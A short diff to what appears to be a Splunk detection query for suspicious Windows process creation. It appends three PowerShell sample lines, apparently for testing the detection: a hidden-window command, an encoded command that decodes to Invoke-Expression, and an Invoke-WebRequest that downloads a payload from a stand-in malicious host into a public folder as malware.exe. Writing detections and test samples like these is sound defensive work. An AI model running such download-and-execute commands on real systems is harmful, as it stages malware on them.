@@ -45,3 +45,8 @@ index=windows AND source="WinEventLog:Security" AND EventCode=4688 AND new_proce
 | eval severity = "High" 
 | rename dvc_nt_host AS dvc 
 | table dvc user parent_process_name new_process_name severity
+
+
+powershell.exe -WindowStyle Hidden -Command "Write-Output 'Simulating hidden window'"
+powershell.exe -EncodedCommand SQBFAFgA
+Invoke-WebRequest -Uri "http://malicious-example.com/payload" -OutFile "C:\Users\Public\malware.exe"
